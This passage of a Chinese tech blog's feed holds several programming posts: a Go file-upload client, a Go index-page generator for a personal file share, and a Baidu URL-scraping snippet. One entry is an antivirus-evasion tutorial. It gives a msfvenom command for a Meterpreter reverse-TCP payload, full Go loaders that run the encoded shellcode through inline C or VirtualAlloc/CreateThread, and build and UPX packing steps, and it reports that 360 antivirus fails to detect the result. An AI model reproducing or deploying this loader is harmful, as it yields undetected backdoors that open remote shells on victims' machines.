&lt;h2 id=&quot;0x02-代码&quot;&gt;&lt;a href=&quot;#0x02-代码&quot; class=&quot;headerlink&quot; title=&quot;0x02 代码&quot;&gt;&lt;/a&gt;0x02 代码&lt;/h2&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;plus&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; x, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; y)&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://akkuman.coding.me/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://akkuman.coding.me/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Golang模拟客户端POST表单功能文件上传</title>
    <link href="http://akkuman.coding.me/2017/07/07/Golang%E6%A8%A1%E6%8B%9F%E5%AE%A2%E6%88%B7%E7%AB%AFPOST%E8%A1%A8%E5%8D%95%E5%8A%9F%E8%83%BD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html"/>
    <id>http://akkuman.coding.me/2017/07/07/Golang模拟客户端POST表单功能文件上传.html</id>
    <published>2017-07-07T05:04:50.000Z</published>
    <updated>2017-09-04T15:26:47.782Z</updated>
    
    <content type="html"><![CDATA[<p>客户端通过multipart.Write把文件的文本流写入一个缓存中，然后调用http的Post方法把缓存传到服务器。<br><a id="more"></a><br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">    <span class="string">"bytes"</span></div><div class="line">    <span class="string">"fmt"</span></div><div class="line">    <span class="string">"io"</span></div><div class="line">    <span class="string">"io/ioutil"</span></div><div class="line">    <span class="string">"mime/multipart"</span></div><div class="line">    <span class="string">"net/http"</span></div><div class="line">    <span class="string">"os"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">postFile</span><span class="params">(filename <span class="keyword">string</span>, targetUrl <span class="keyword">string</span>)</span> <span class="title">error</span></span> &#123;</div><div class="line">    bodyBuf := &amp;bytes.Buffer&#123;&#125;</div><div class="line">    bodyWriter := multipart.NewWriter(bodyBuf)</div><div class="line"></div><div class="line">    <span class="comment">//关键的一步操作</span></div><div class="line">    fileWriter, err := bodyWriter.CreateFormFile(<span class="string">"uploadfile"</span>, filename)</div><div class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">        fmt.Println(<span class="string">"error writing to buffer"</span>)</div><div class="line">        <span class="keyword">return</span> err</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">//打开文件句柄操作</span></div><div class="line">    fh, err := os.Open(filename)</div><div class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">        fmt.Println(<span class="string">"error opening file"</span>)</div><div class="line">        <span class="keyword">return</span> err</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">defer</span> fh.Close()</div><div class="line"></div><div class="line">    <span class="comment">//iocopy</span></div><div class="line">    _, err = io.Copy(fileWriter, fh)</div><div class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">        <span class="keyword">return</span> err</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    contentType := bodyWriter.FormDataContentType()</div><div class="line">    bodyWriter.Close()</div><div class="line"></div><div class="line">    resp, err := http.Post(targetUrl, contentType, bodyBuf)</div><div class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">        <span class="keyword">return</span> err</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">defer</span> resp.Body.Close()</div><div class="line">    resp_body, err := ioutil.ReadAll(resp.Body)</div><div class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">        <span class="keyword">return</span> err</div><div class="line">    &#125;</div><div class="line">    fmt.Println(resp.Status)</div><div class="line">    fmt.Println(<span class="keyword">string</span>(resp_body))</div><div class="line">    <span class="keyword">return</span> <span class="literal">nil</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// sample usage</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">    target_url := <span class="string">"http://localhost/upload"</span></div><div class="line">    filename := <span class="string">"./example.pdf"</span></div><div class="line">    postFile(filename, target_url)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;客户端通过multipart.Write把文件的文本流写入一个缓存中，然后调用http的Post方法把缓存传到服务器。&lt;br&gt;
    
    </summary>
    
      <category term="Golang" scheme="http://akkuman.coding.me/categories/Golang/"/>
    
    
      <category term="Golang" scheme="http://akkuman.coding.me/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>关于msf反弹后门的免杀Tips</title>
    <link href="http://akkuman.coding.me/2017/04/20/msf-AntiVirus.html"/>
    <id>http://akkuman.coding.me/2017/04/20/msf-AntiVirus.html</id>
    <published>2017-04-20T05:09:24.000Z</published>
    <updated>2017-04-20T14:00:25.177Z</updated>
    
    <content type="html"><![CDATA[<p>msf是一个很强大的工具，我经常会在渗透用它来反弹shell，不过它生成的反弹后门会被不少杀软kill，这篇文章只是讲讲我在msf中一个简单的免杀小技巧<br><a id="more"></a></p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>我以前接触过一款python的远控，其实说是远控，基本也就是nc的功能加了一个服务端的web页面控制并加了一些其他的功能可以用来管理诸多客户机<br>这款远控我下载下来用过，并用pyinstaller打包成了exe（缺点是体积太过庞大），惊奇的是，360不杀它，然后自己想着其他语言是不是也会这样，于是我用golang写了一个简易版nc反弹，编译之后，也是不查杀的。python和golang有一个共同点，就是可以用来内联C编程，所以C语言的shellcode按理说应该会达到同样的效果</p>
<h2 id="得到shellcode"><a href="#得到shellcode" class="headerlink" title="得到shellcode"></a>得到shellcode</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LPORT=5555 LHOST=192.168.1.100 <span class="_">-e</span> x86/shikata_ga_nai -i 11 <span class="_">-f</span> py &gt; 1.py</div></pre></td></tr></table></figure>
<p>建议是生成32位的，如果想生成64位也可以，<code>-e x86/shikata_ga_nai -i 11</code>是指用<code>x86/shikata_ga_nai</code>编码迭代11次，然后生成py文件<br>py文件打开是shellcode，我们接下来对它进行一点小改造，对于python去执行shellcode的方法，相信小伙伴都已经不陌生，在《python灰帽子》中有讲解，我今天要使用的是golang，其实个人认为golang执行shellcode的代码是更简洁的</p>
<h2 id="Golang环境搭建"><a href="#Golang环境搭建" class="headerlink" title="Golang环境搭建"></a>Golang环境搭建</h2><p>安装Golang32位（建议32位，与前面对应，在测试过程中，如果32位shellcode配合64位golang加32位gcc，就算把golang的GOARCH改为386也依旧会失败，建议一一对应），安装gcc32位（可以使用<a href="http://tdm-gcc.tdragon.net/download" target="_blank" rel="external">TDM-GCC</a>）</p>
<h2 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h2><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line">void call(char *code) &#123;</div><div class="line">    int (*ret)() = (int(*)())code;</div><div class="line">    ret();</div><div class="line">&#125;</div><div class="line">*/</div><div class="line"><span class="keyword">import</span> <span class="string">"C"</span></div><div class="line"><span class="keyword">import</span> <span class="string">"unsafe"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">    buf := <span class="string">""</span></div><div class="line">    buf += <span class="string">"\xdd\xc6\xd9\x74\x24\xf4\x5f\x33\xc9\xb8\xb3\x5e\x2c"</span></div><div class="line">    buf += <span class="string">"\xc9\xb1\x97\x31\x47\x1a\x03\x47\x1a\x83\xc7\x04\xe2"</span></div><div class="line">    buf += <span class="string">"\x46\x84\xfd\x72\xee\x0e\xb5\x96\x37\x04\x6d\x63\x9f"</span></div><div class="line">    buf += <span class="string">"\xcc\xa4\x3a\x8e\x8c\xf7\x39\x81\xca\xe4\x42\xff\xce"</span></div><div class="line">    buf += <span class="string">"\xa3\xa2\xdb\x06\xc0\x3f\xaf\x41\x73\xba\xf7\x20\x13"</span></div><div class="line">    buf += <span class="string">"\x98\x8c\xff\xfa\x0a\xda\x6e\xf2\x6d\xc3\x81\x07\xc0"</span></div><div class="line">    buf += <span class="string">"\x1b\x37\xeb\xa2\xa9\x32\x71\xaf\xe9\x20\xd1\xaa\x9e"</span></div><div class="line">    buf += <span class="string">"\xbd\x82\xf3\x81\x1f\xab\xbf\xc4\xd9\x6c\x75\x37\x3a"</span></div><div class="line">    buf += <span class="string">"\x53\x78\x90\x79\xaf\x93\x1b\xb3\x15\x09\xe5\x45\x5c"</span></div><div class="line">    buf += <span class="string">"\x26\x0f\x0d\x16\x52\xf1\x8a\x7e\x8b\xc4\x50\x8e\x0a"</span></div><div class="line">    buf += <span class="string">"\x38\x2f\x2b\x40\x73\x0b\xf0\x51\x5f\xc6\xbf\x04\x47"</span></div><div class="line">    buf += <span class="string">"\x80\x36\xe5\x88\x88\xb3\xfc\xa0\x52\xfe\x92\x81\x8d"</span></div><div class="line">    buf += <span class="string">"\x89\xf2\x6a\xcc\x7f\x9a\xe9\x1a\x30\x73\xa3\x63\x42"</span></div><div class="line">    buf += <span class="string">"\x10\xe9\xcf\x62\xe4\x06\x52\xe1\x8d\x88\xfe\x52\xc4"</span></div><div class="line">    buf += <span class="string">"\xc3\xed\x7a\x0e\x66\x5f\x8c\x2c\xef\xfa\xbd\x8c\x79"</span></div><div class="line">    buf += <span class="string">"\x6c\x01\xe3\x5c\xde\xc4\x8a\x4c\x7d\x34\x32\xb5\x23"</span></div><div class="line">    buf += <span class="string">"\x56\x6c\x52\x3f\x15\x26\x6a\xf8\x6b\x81\x2c\x23\x8d"</span></div><div class="line">    buf += <span class="string">"\x41\x6e\x24\x30\xc6\xcb\xba\x26\xd4\x3b\x37\xd3\xc6"</span></div><div class="line">    buf += <span class="string">"\xa8\x5a\x16\x8f\x1e\x27\xca\xcb\xda\x7f\x74\x62\xb2"</span></div><div class="line">    buf += <span class="string">"\x62\xa6\xb1\xfc\x64\x53\x3a\xa7\xa4\x21\x3d\x79\x08"</span></div><div class="line">    buf += <span class="string">"\x06\x74\x2a\xa2\xe7\x0d\x68\x16\xa3\x96\xe5\xad\x32"</span></div><div class="line">    buf += <span class="string">"\x10\xa3\x0f\x49\xc3\x69\xa7\x5b\x61\x1a\xf8\x1d\x9e"</span></div><div class="line">    buf += <span class="string">"\x9b\x3a\x00\xfc\x18\xc3\x42\x1a\xd6\x44\x5d\xfe\xc5"</span></div><div class="line">    buf += <span class="string">"\xb6\x68\xd2\xad\x24\xda\x74\xa7\xf3\x66\x9a\x42\x7a"</span></div><div class="line">    buf += <span class="string">"\x50\xf0\x0b\x47\xbc\xad\x6c\x1e\xca\xbe\x90\xca\xc3"</span></div><div class="line">    buf += <span class="string">"\x8e\x5b\xde\x66\xe2\xb3\x20\x6f\x38\x17\xc1\xac\xfb"</span></div><div class="line">    buf += <span class="string">"\xd3\x2f\x91\xa7\xff\x65\xd7\xd0\x25\x4c\xd4\xb3\x35"</span></div><div class="line">    buf += <span class="string">"\x38\xa1\x82\xb8\x23\x42\xe9\xa5\x95\x8e\xc4\x35\xca"</span></div><div class="line">    buf += <span class="string">"\x92\xfe\xde\x62\x70\xd6\x7a\x7f\xfd\xfb\xf0\x24\xbd"</span></div><div class="line">    buf += <span class="string">"\x5d\x6d\x3d\x13\xbc\x1d\x25\x54\x9d\x0e\x68\xc8\x9a"</span></div><div class="line">    buf += <span class="string">"\x10\x87\xf0\xc9\xac\x37\x57\x84\x23\x5f\x8a\xc0\xab"</span></div><div class="line">    buf += <span class="string">"\x52\x6e\xae\x79\xa2\xdb\xff\xd8\x41\x28\x8b\xd3\x9d"</span></div><div class="line">    buf += <span class="string">"\x68\x3c\x55\xf2\xfe\x0c\x8a\x38\xdf\xb3\x80\x9b\x70"</span></div><div class="line">    buf += <span class="string">"\x2b\x4e\xe1\xfa\x0b\xfe\xf5\xc3\x1a\x0d\x83\xb0\x69"</span></div><div class="line">    buf += <span class="string">"\xd0\x68\xfb\xe0\xae\xbd\x56\x52\x17\x9a\xf8\x8f\xc0"</span></div><div class="line">    buf += <span class="string">"\x14\x8c\xb0\xf7\x0e\x87\xfa\x54\xf4\x04\x4a\x5a\xc8"</span></div><div class="line">    buf += <span class="string">"\x89\x57\x0e\xbf\x7a\x76\x9b\xfe\xb8\x5f\x31\x42\xec"</span></div><div class="line">    buf += <span class="string">"\xaf\x18\x9e\x3f\xf0\x09\x79\x86\xb3\x08\x29\x50\xfd"</span></div><div class="line">    buf += <span class="string">"\xc3\x46\x7d\x24\x51\x5b\xd0\x81\x19\x6f\xc2\x2c\x17"</span></div><div class="line">    buf += <span class="string">"\xab\xa3\xb7\xd9\x6f\x82\xd9\x37\x5f\x38\x01\xd8\xfd"</span></div><div class="line">    buf += <span class="string">"\xfd\x11\x22\x61\xd0\x92\x45\x37\x4f\x6c\x4e\x91\x3b"</span></div><div class="line">    buf += <span class="string">"\x42\x07\xc5\x77\xdc\x52\xd6\xc7\x9d\x7b\x62\xba\x1c"</span></div><div class="line">    buf += <span class="string">"\x62\x3c\xde\xad\x96\x03\x55\xde\x9d\x52\x5c\x5d\x0c"</span></div><div class="line">    buf += <span class="string">"\x73\x0e\xc3\x4c\xae\x7d\x1c\x7c\x64\xaf\xbb\xce\xa6"</span></div><div class="line">    buf += <span class="string">"\x02\x0e\xb1\x51\xc4\x2d\x1b\x6b\xb7\x7c\xd9\x4b\xc3"</span></div><div class="line">    buf += <span class="string">"\x8c\x43\xd6\x1b\x2a\x4f\x5e\x0a\x9a\xd5\x4d\x45\x64"</span></div><div class="line">    buf += <span class="string">"\x6c\x0c\xc8\xf5\x59\xd7\x45\x36\x85\x99\x8d\x34\x65"</span></div><div class="line">    buf += <span class="string">"\x21\xd3\x3b\x35\xce\x22\x29\x0c\x4e\xca\x48\x3f\x55"</span></div><div class="line">    buf += <span class="string">"\x5d\x1b\xda\x35\xc1\x2d"</span></div><div class="line">    <span class="comment">// at your call site, you can send the shellcode directly to the C</span></div><div class="line">    <span class="comment">// function by converting it to a pointer of the correct type.</span></div><div class="line">    shellcode := []<span class="keyword">byte</span>(buf)</div><div class="line">    C.call((*C.char)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])))</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>以上就是全部代码<br>其实Golang还有个执行shellcode的方法是不用内联C语言的，但是我这边测试能接到反弹shell，但是执行命令会直接断开，代码我也贴出来<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">    <span class="string">"syscall"</span></div><div class="line">    <span class="string">"unsafe"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">ThreadExecute</span><span class="params">(Shellcode []<span class="keyword">byte</span>)</span></span> &#123;</div><div class="line">    <span class="keyword">var</span> K32 = syscall.MustLoadDLL(<span class="string">"kernel32.dll"</span>)</div><div class="line">    <span class="keyword">var</span> CreateThread = K32.MustFindProc(<span class="string">"CreateThread"</span>)</div><div class="line">    <span class="keyword">var</span> VirtualAlloc = K32.MustFindProc(<span class="string">"VirtualAlloc"</span>)</div><div class="line">    <span class="keyword">var</span> WaitForSingleObject = K32.MustFindProc(<span class="string">"WaitForSingleObject"</span>)</div><div class="line"></div><div class="line">    Addr, _, _ := VirtualAlloc.Call(<span class="number">0</span>, <span class="keyword">uintptr</span>(<span class="built_in">len</span>(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)</div><div class="line">    AddrPtr := (*[<span class="number">990000</span>]<span class="keyword">byte</span>)(unsafe.Pointer(Addr))</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(Shellcode); i++ &#123;</div><div class="line">        AddrPtr[i] = Shellcode[i]</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ThreadAddr, _, _ := CreateThread.Call(<span class="number">0</span>, <span class="number">0</span>, Addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</div><div class="line">    WaitForSingleObject.Call(ThreadAddr, <span class="number">0xFFFFFFFF</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>关于断开的原因，希望找出原因的能告知我一下，其实我们会发现，内联C是比较简单的</p>
<h2 id="杀毒测试"><a href="#杀毒测试" class="headerlink" title="杀毒测试"></a>杀毒测试</h2><p>在代码所在目录cmd执行<code>go build</code>得到二进制文件（或者可以用<code>go build -ldflags=&quot;-s -w&quot;</code>减小体积，<code>go build -ldflags=&quot;-H windowsgui -s -w&quot;</code>去掉命令窗口）<br><img src="https://ooo.0o0.ooo/2017/04/20/58f840f0e9a00.png" alt=""><br><img src="https://ooo.0o0.ooo/2017/04/20/58f840f8a704c.png" alt=""></p>
<p>可以看到360的静态查杀和动态查杀都没有发现<br>那么是否正常工作呢<br><img src="https://ooo.0o0.ooo/2017/04/20/58f840f6d4862.png" alt=""></p>
<p>可以看到完全是没问题的，体积比python编译出来的小的多，编译出来是500多kb，然后经过upx压缩了一下（测试upx压缩后功能依旧正常），降低到了200多kb<br><img src="https://ooo.0o0.ooo/2017/04/20/58f840dbdc23f.png" alt=""></p>
<h2 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h2><div class="bili_video"><embed height="452" width="544" quality="high" allowfullscreen="true" type="application/x-shockwave-flash" src="http://share.acg.tv/flash.swf" flashvars="aid=9975200&page=1" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash"></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;msf是一个很强大的工具，我经常会在渗透用它来反弹shell，不过它生成的反弹后门会被不少杀软kill，这篇文章只是讲讲我在msf中一个简单的免杀小技巧&lt;br&gt;
    
    </summary>
    
      <category term="Hacker" scheme="http://akkuman.coding.me/categories/Hacker/"/>
    
    
      <category term="Hacker" scheme="http://akkuman.coding.me/tags/Hacker/"/>
    
  </entry>
  
  <entry>
    <title>自己网盘的页面生成器(私用公开-Golang)</title>
    <link href="http://akkuman.coding.me/2017/04/13/my-yun-generateHTML-with-golang.html"/>
    <id>http://akkuman.coding.me/2017/04/13/my-yun-generateHTML-with-golang.html</id>
    <published>2017-04-13T08:41:34.000Z</published>
    <updated>2017-04-14T15:55:42.737Z</updated>
    
    <content type="html"><![CDATA[<p>虽说我的网盘（exm，也许页面确实丑了点，不过页面生成的样式你自己可以改）美工已经被乱刀砍死，但是还是有小伙伴问我是怎么搭建的</p>
<h2 id="关于搭建"><a href="#关于搭建" class="headerlink" title="关于搭建"></a>关于搭建</h2><p>这个真没什么好说的，vps我只安装了nginx，然后配置域名指向到我的同步目录，然后用其他工具同步上去就行了（关于问自己手动同步麻烦的，其实并不麻烦，有很多好用的软件，本人用的Resilio Sync）<br><a id="more"></a></p>
<h2 id="关于页面的生成"><a href="#关于页面的生成" class="headerlink" title="关于页面的生成"></a>关于页面的生成</h2><h3 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h3><p>那时候只有两三个文件，html页面是我手写的手动增加的</p>
<h3 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h3><p>此时已经有了一个子目录，文件开始增多，我开始考虑写个简单的先用着，Python的写了，不过速度感觉有点不如意（原谅我的吹毛求疵）,并且有个麻烦事是每次重装系统后需要安装Python，然后我选用了Golang，时间仓促写了一个单页面生成，不进行目录深度遍历的，也就是说我每次新开一个目录需要把这个程序拷贝到当目录下双击生成html</p>
<h3 id="第三阶段"><a href="#第三阶段" class="headerlink" title="第三阶段"></a>第三阶段</h3><p>文件夹和文件日益增多，上面的方式我已经感觉到特别繁琐了，需要找个机会把代码重构一下，使他更加优化<br>然后我开始着手写第二版，这个版本我没保留，具体功能就是对上一个版本做了一点改进，使它支持了深度遍历<br>但是自从<strong>T00ls灵车漂移事件以来，官方管理员给<em>GetWriter</em>老哥（如果谁认识希望告知，希望能致个歉）的一纸封书将此事推上风口浪尖，作为始作俑者，我网站首当其冲，遭受了大量老哥多来自夜间的洗礼（说实话，希望高抬贵手，流量快没了）</strong>，这件事情持续发酵了两三天，我一直在思考，如何为老哥们带来更良好的观感体验，于是我觉得应该要让这个页面生成器对前端展示的修改更加方便，无须从代码入手，开始了第三版的编写</p>
<h4 id="暂时实现的功能"><a href="#暂时实现的功能" class="headerlink" title="暂时实现的功能"></a>暂时实现的功能</h4><ul>
<li>支持模板</li>
<li>加入了配置文件（其实也是模板）</li>
<li>加入了noView.txt规则（具体表现为这个txt中的文件名将不参与生成html页面）<br>可能以后会抽时间再进行优化，这个时间不定，看哪天自己的需求更高了</li>
</ul>
<h2 id="更新记录在下面，更新后的代码就不贴了，之前的代码我就在这个页面上删了，自己感兴趣可以上github查看"><a href="#更新记录在下面，更新后的代码就不贴了，之前的代码我就在这个页面上删了，自己感兴趣可以上github查看" class="headerlink" title="更新记录在下面，更新后的代码就不贴了，之前的代码我就在这个页面上删了，自己感兴趣可以上github查看"></a>更新记录在下面，更新后的代码就不贴了，<strong>之前的代码我就在这个页面上删了</strong>，自己感兴趣可以上github查看</h2><h2 id="至于前端"><a href="#至于前端" class="headerlink" title="至于前端"></a>至于前端</h2><p><del>你们别想了，前端之魂在我体内没存在过，哪天兴致来了可能会看看相关知识，这个丑页面就丑着凑合看吧，如果有能力可以进行二次修改</del></p>
<p><strong>为它搞了一套css与文件类型图标</strong>（关于style.css文件，是需要你放到远端在线调用的，你可以上传到七牛，或者你同步的时候放到网站根目录下，然后通过域名+/style.css的方式来调用）</p>
<h2 id="更新记录"><a href="#更新记录" class="headerlink" title="更新记录"></a>更新记录</h2><ul>
<li>对一部分冗余的进行了优化，提升了一丁点效率</li>
<li>可以放到环境变量path了，不需要放到本目录里了，只需要在本目录调用就可以（当然），按照之前的方法也是可以的</li>
</ul>
<hr>
<ul>
<li>对文件li列表做了排序，优先级为后缀名-&gt;文件名</li>
<li>对li列表加了css类，可以自定义li的css了，具体见生成后的文件</li>
<li>为页面生成器搞了一套css，为类型加上了图标，具体效果见下图<br><img src="https://ooo.0o0.ooo/2017/04/14/58f0f09499fda.png" alt="snipaste_20170414_235335.png"></li>
</ul>
<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>这次不能给抓住机会了，放github吧</p>
<ul>
<li><a href="https://github.com/akkuman/generateIndexHTML" target="_blank" rel="external">代码下载地址</a></li>
<li><a href="https://github.com/akkuman/generateIndexHTML/bin" target="_blank" rel="external">二进制文件下载地址</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;虽说我的网盘（exm，也许页面确实丑了点，不过页面生成的样式你自己可以改）美工已经被乱刀砍死，但是还是有小伙伴问我是怎么搭建的&lt;/p&gt;
&lt;h2 id=&quot;关于搭建&quot;&gt;&lt;a href=&quot;#关于搭建&quot; class=&quot;headerlink&quot; title=&quot;关于搭建&quot;&gt;&lt;/a&gt;关于搭建&lt;/h2&gt;&lt;p&gt;这个真没什么好说的，vps我只安装了nginx，然后配置域名指向到我的同步目录，然后用其他工具同步上去就行了（关于问自己手动同步麻烦的，其实并不麻烦，有很多好用的软件，本人用的Resilio Sync）&lt;br&gt;
    
    </summary>
    
      <category term="Golang" scheme="http://akkuman.coding.me/categories/Golang/"/>
    
    
      <category term="Golang" scheme="http://akkuman.coding.me/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>百度搜索引擎取真实地址-python代码</title>
    <link href="http://akkuman.coding.me/2017/04/11/BaiduSearch-get-realUrl-with-python.html"/>
    <id>http://akkuman.coding.me/2017/04/11/BaiduSearch-get-realUrl-with-python.html</id>
    <published>2017-04-11T04:49:06.000Z</published>
    <updated>2017-04-11T05:09:18.329Z</updated>
    
    <content type="html"><![CDATA[<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseBaidu</span><span class="params">(keyword, pagenum)</span>:</span></div><div class="line">    keywordsBaseURL = <span class="string">'https://www.baidu.com/s?wd='</span> + str(quote(keyword)) + <span class="string">'&amp;oq='</span> + str(quote(keyword)) + <span class="string">'&amp;ie=utf-8'</span> + <span class="string">'&amp;pn='</span></div><div class="line">    pnum = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span> pnum &lt;= int(pagenum):</div><div class="line">        baseURL = keywordsBaseURL + str(pnum*<span class="number">10</span>)</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            request = requests.get(baseURL, headers=headers)</div><div class="line">            soup = BeautifulSoup(request.text, <span class="string">"html.parser"</span>)</div><div class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> soup.select(<span class="string">'div.c-container &gt; h3 &gt; a'</span>):</div><div class="line">                url = requests.get(a[<span class="string">'href'</span>], headers=headers).url</div><div class="line">                <span class="keyword">yield</span> url</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">yield</span> <span class="keyword">None</span></div><div class="line">        <span 